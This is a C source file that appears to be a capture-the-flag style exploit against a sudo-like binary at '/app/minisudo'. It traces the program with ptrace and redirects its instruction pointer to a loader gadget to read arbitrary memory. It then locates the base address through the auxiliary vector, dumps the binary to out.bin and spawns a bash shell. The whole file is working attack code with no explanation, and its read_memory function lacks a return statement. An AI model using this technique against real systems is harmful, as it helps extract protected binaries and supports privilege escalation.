#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>


typedef uint64_t u64;

u64 gadget;

u64 read_memory(pid_t pid, u64 addr) {
    ptrace(PTRACE_POKEUSER, pid, offsetof(struct user, regs.rip), gadget);
    ptrace(PTRACE_POKEUSER, pid, offsetof(struct user, regs.rdi), addr);
    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_PEEKUSER, pid, offsetof(struct user, regs.rdi), NULL);
}


char *const argv[] = {"/app/minisudo", NULL};
char *const envp[] = {NULL};

int main() {
    pid_t child_pid;
    child_pid = fork();

    if (child_pid == 0) {
        // Child process
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
            perror("ptrace");
            return 1;
        }
        execve(argv[0], argv, envp);
        perror("execve");
        return 1;
    } else if (child_pid > 0) {
        // Parent process
        int status;
        waitpid(child_pid, &status, 0);
        u64 rip = ptrace(PTRACE_PEEKUSER, child_pid, offsetof(struct user, regs.rip), NULL);
        printf("rip: 0x%lx\n", rip);
        
        gadget = rip + 0x58; // 0x7ffff7fe3308 - 0x7ffff7fe32b0
        
        printf("data: 0x%lx\n", read_memory(child_pid, gadget));
        
        u64 rsp = ptrace(PTRACE_PEEKUSER, child_pid, offsetof(struct user, regs.rsp), NULL);
        
        for (; read_memory(child_pid, rsp) != 0x3; rsp += 8); // AT_PHDR
        
        u64 base = read_memory(child_pid, rsp+8) - 0x40;
        printf("base: 0x%lx\n", base);
        
        int fd = open("./out.bin", O_WRONLY|O_CREAT, 0666);
        
        for (u64 i = 0; i < 0x5000; i += 8) {
            if (i == 0x3000) i += 0x1000; // Skip repeated part
            u64 value = read_memory(child_pid, base+i);
            write(fd, &value, sizeof(value));
        }
        close(fd);
        printf("Written out.bin...\n");
        if (kill(child_pid, 9))
            perror("kill");
        execl("/bin/bash", "/bin/bash", NULL);
    } else {
        perror("fork");
        return 1;
    }

    return 0;
}

